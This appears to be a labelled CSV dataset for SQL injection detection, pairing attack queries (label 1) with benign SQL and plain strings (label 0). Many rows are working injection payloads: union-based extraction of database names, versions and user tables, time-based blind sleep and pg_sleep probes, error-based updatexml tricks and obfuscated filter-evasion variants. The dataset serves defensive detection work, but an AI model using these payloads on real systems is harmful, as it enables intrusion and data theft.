Query,Label,cluster,stratify_col
1'   )    )    as wdor where 7426  =  7426,1,6,1_6
select * from catch where instrument between '1996-07-01' and '1996-07-31',0,5,0_5
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 191 )  order by meta_id asc",0,7,0_7
romeu herrero,0,8,0_8
"0o1%'  and    (
 select * from   (  select  ( ?sleep? (  (select (select (select 1)))   )  ! )     )  fzno  )   and '%'='",1,9,1_9
"%u0027/**/union/**/select/**/null,/**/null,/**/null/**/--/**/",1,0,1_0
"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",1,4,1_4
"  select occasionally,younger from mass where thou = 'trip' union select stretch, engineer from certain",0,7,0_7
"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",1,6,1_6
"1)) union select 1,database(),3 or (1)--",1,4,1_4
"    &&   +0o7xax2o9x4  =
|utl_inaddr.get_host_address~>""( /  (*~select>distinct ( $username> )
:/*sj?ix*/from> ~(  select distinct :(  username  )\*, rownum as`limit}from sys.all_users  ) ?_where;limit+like ?0x4x0x0x0o0b0x0x0x0b1501x0o0x5b0o7b1x0b0x64b1050b5  +)    ){ and'i'~ like ;'i",1,0,1_0
;/*!*/select pg_sleep(5);  or (1)--,1,0,1_0
select * from realize where    not tent = 'funny',0,5,0_5
15142,0,3,0_3
"1'			union			select			table_name,			null,			null			from			information_schema.tables			----l9m89",1,4,1_4
75512816k,0,3,0_3
"  select * from won where lucky in  ( 'follow', 'gray', 'air' )  ",0,5,0_5
select avg ( smell ) from alive select sum ( subject ) ,0,1,0_1
select * from turn where central like '%who%',0,7,0_7
3893860000000000,0,3,0_3
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",1,9,1_9
t6r551ero,0,8,0_8
"1'  )   union all select null,null,null,null,null,null--",1,4,1_4
vazkn,0,8,0_8
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",1,9,1_9
1' where 3028  =  3028,1,6,1_6
select * from wonder,0,5,0_5
select * from three where captured = 'actually' limit 3,0,5,0_5
select * from beat,0,5,0_5
2777670000000000,0,3,0_3
select * from ocean 3,0,5,0_5
"!select * from users~where id}='6' union]select\.and""u""=""u"" and*true  &&  true  &&  true and true or!(select (select 9)) and ""p"" not like'""pz"" or false^or(select 0x1c92) not like (select (select 0x38aa))` or  0b0 and 0x1#,@@version -- 2x0o1x0x1b0b0o0o145'~irlapn}i!t",1,2,1_2
6x0x1'+ ( ;select[ankx where0x1a0b1085101   like   6789,1,2,1_2
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --#rj1f0",1,9,1_9
18449,0,3,0_3
" select * from users where id =	(select 0x1) or ""_;"" or (select 1)
 =  0x1 or false or '~
wk'!='~
wk' -- (select#(select 5))e",1,5,1_5
1 where 4245  =  4245,1,6,1_6
select * from  ( select service from series ) ,0,7,0_7
"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,4,1_4
select top 50 percent * from honor select * from dog fetch first 50 percent rows onlyselect top 3 * from steep,0,5,0_5
"iif	  or  false#(<;(select (select	0x210e))?= 1862,0x4,0x9/0o0 )/*mh:*0x0x1y}kqb&gj;""*/ 1ldu^fh",1,7,1_7
select * from market where road = 'long' limit 3,0,5,0_5
select   ( case when   ( 0x20aa like (select 7872)  )   then 0b1103011011010 else cast  (  1 as int  )  /} (  select (select (select (select 0))) from dual  )   end  )   from dual--,1,4,1_4
" select * from users where/**/id  = +5b1 or ""{1""  = (select 3) or 0x1. =  (select 1)  &&  ""5:""=""5:"" and)""h"" not like ""h&"" or false and and true#(select (select 1)) or ""/"" not like ""/"" or false -- (select1)ye hl2rs",1,2,1_2
" select * from family order by south, angle",0,7,0_7
select sea ( s )  from unusual,0,1,0_1
"0x1%"" and;(select>(select 0b1100100010010)),=/**/ 0b0b0o17417--",1,4,1_4
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",1,4,1_4
select accident from alive union all select become from tool order by long,0,7,0_7
 update deeply set dance = 'trace'where truth = 'bar',0,5,0_5
1\'1,1,2,1_2
 update slipped set field = 'pleasant'where ocean = 'hungry',0,5,0_5
37329,0,3,0_3
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   '%'  =  ',1,9,1_9
select * from without where managed = 'higher'  or stick = 'biggest',0,5,0_5
"1' or < (  select 'vsfg' where 0xddb=0xdc7   and   updatexml  ( 
0x18f3,concat  (  0x0x2e,0x3171708a0x46, ~( :select   (  elt  (  (select (select (select (select 3398))))   like   (select (select (select (select (select (select 0xd47)))))),(select (select (select 1)))_  )   ) 	  ?)  ,0x0o0x0o1435a763a79  )  ,0x489   ) _ @) 
  or '",1,9,1_9
" select *!from users where id^= '0x5' 
<union select null,banner
from v$versionwhere&rownum ='1 and+""q""=""q""  and  ""bm""/*m */  not like   ""bm<""  or  0xaaf<>5xaaf and (select (select (select 1))) and (select (select 1)) or false -- 0b0b1100101b9'a<k:",1,5,1_5
" select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",1,2,1_2
1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',1,9,1_9
select * from cutting where flat  between 10 and 20,0,5,0_5
brier,0,8,0_8
select * from farm where grass = 'material' fetch first 3 rows only,0,5,0_5
"select:* from}users!where+id, like 
(select 0x1)or $+<\	or\6o5x0x4o4:/*&c/a/xsux""xgjl]m*/like :0x1 or false--1v\2vh",1,2,1_2
 update settle set feathers = 'motor'where breathing = 'spent',0,5,0_5
"1%""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,1_4
"-9535"" order by 1--",1,6,1_6
"nullfrom/*
*/information_schema.tables",1,0,1_0
"_(  select   (  case when   (  (select (select (select:(select 9525))))"" like  (select (select 0x2440)) /*t(y*/)   then0x2535 else 0x2535*  (  select 0x2535 from master..sysdatabases  )	  end	_ )    ) ",1,4,1_4
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",1,4,1_4
"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,1_4
peng1in,0,8,0_8
cado,0,8,0_8
"1b0b0b11010110110111011o0o5x6x0b0o6%'|/*)""txwt*/ )=~;/**/)`|
<|)/*awyo*/   and &&>true or (select 4241)<>(select?(select 4249))or false#,elt ;(`[(select?0x1x0x4x1d0x0b101b0b0b1001011001)/*x*/ like/**/ 0b0o0x0o0o0b101b0o6o0b0o0o0b10181001101000021,7xf4x2o0b18-[)&, /**/and  &*<(}.*(<#@@`( ?'%'& =|,'6:m8^",1,2,1_2
"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",1,4,1_4
"declare[@s/*0x216*/varchar 	`( $(select 0b2x0x0b111d909a3)`&)	 select @s> ;like	,-2o0o0o0x0b10010101101110000c6<...",1,0,1_0
"1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1_1
"   select underline,in,whispered,eight,brave     (  (  command join rise on jar.bank =  strong.heavy )   inner join oceanon orders.crew =  frighten.chanceid ) ",0,1,0_1
test'/**//**//**//**/or/**//**//**//**/'1'	in (1)	'1'/**//**//**//**/--/**//**//**//**/,1,0,1_0
"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
8084980000000000,0,3,0_3
84826588n,0,3,0_3
" select * from users where id""= '0' union select   ( ;\  ) ?,@@version    or + ""_""=""_q"" or false  or  false  &&  ""bfvsi""<>""bfvsim"" --	0o4')z",1,2,1_2
"insert into with ( leaf, trip, today, life, view, afraid )  values  ( 'been', 'round'. suit', 'replied', 'year', 'help', 'save' )  ",0,1,0_1
flo hosta,0,8,0_8
beckwith,0,8,0_8
45591,0,3,0_3
"end
and  &	(! Ã¢Â .(/*(select 2)
5c{!y!s$u;cr\x;o5$6*/ : +(""
'hglq'
like:'hglq",1,2,1_2
select * from  ( select highway from walk ) ,0,7,0_7
"1' or ascii(substring(database(), 1, 1)) > 100  /*!*/and 1=1--",1,6,1_6
7542,0,3,0_3
"{)(/! ;]or{/*w.yj5yrfu*/ ;
""(:)'x'?like	'x",1,0,1_0
select volume ( s )  from desk,0,1,0_1
select * from verb where what not like 'grandfather%',0,7,0_7
31013,0,3,0_3
"1"" /**/ )<   )}  or   ( ;select (select 0b0b10014001100010112010011491000011001005110601) from  (  select count \(  *  )  ,concat  (  0x0x0o6d6e0o5aa0b1001101,  (  select   ($/*(select (select (select (select (select (select (select (select (select (select (select (select 9))))))))))))@0x4<\0x53*/elt	:(  ""h""=""h"",0x1.  )    )!    )  ,1x747a0b0b11110100001001001011a21,floor! (_ rand \(  2x0  )  *(select (select<(select>(select (select (select 0x2)))))) \ )'   )   x from information_schema.character_sets group by x  ) a  )   and   (    (   ""vlev"" like ""vlev",1,2,1_2
"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  3   )    )    and 'i'  =  'i",1,4,1_4
test%u0027 or%u0020%u00271'=%u00271%u0027%u0020%u0020or%u0020%u0027b%u0027=%u0027b%u0027--%u0020,1,2,1_2
select heat from sang union all select hour from sky order by promised,0,7,0_7
select * from tongue order by week,0,7,0_7
ares,0,8,0_8
